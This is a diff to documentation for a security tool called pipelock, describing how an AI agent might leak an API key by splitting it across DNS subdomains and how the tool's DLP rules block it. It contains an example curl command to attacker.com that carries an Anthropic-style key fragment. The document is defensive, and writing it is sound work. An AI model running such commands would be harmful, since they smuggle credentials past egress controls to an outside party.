@@ -68,7 +68,7 @@ The agent splits a secret across DNS subdomains. Even without HTTP body access, 
 
 **Attack:**
 ```bash
-curl "https://sk-ant.api03.AABBCCDD.EEFFGGHH.attacker.com/ping"
+curl "https://sk-ant-api03.AABBCCDD.EEFFGGHH.attacker.com/ping"
 ```
 
 **Config that blocks it:**
@@ -83,7 +83,7 @@ dlp:
       severity: critical
 ```
 
-**Why it works:** Two layers catch this. First, subdomain entropy analysis flags high-entropy labels (the `AABBCCDD` and `EEFFGGHH` parts). Second, pipelock strips dots from the hostname and re-runs DLP on the concatenated result, catching `sk-ant-api03-AABBCCDDEEFFGGHH`. Both checks run before DNS resolution, so the query never reaches a DNS server.
+**Why it works:** Two layers catch this. First, subdomain entropy analysis flags high-entropy labels (the `AABBCCDD` and `EEFFGGHH` parts). Second, pipelock strips dots from the hostname and re-runs DLP on the concatenated result, catching `sk-ant-api03AABBCCDDEEFFGGHH`. Both checks run before DNS resolution, so the query never reaches a DNS server.
 
 ---
 
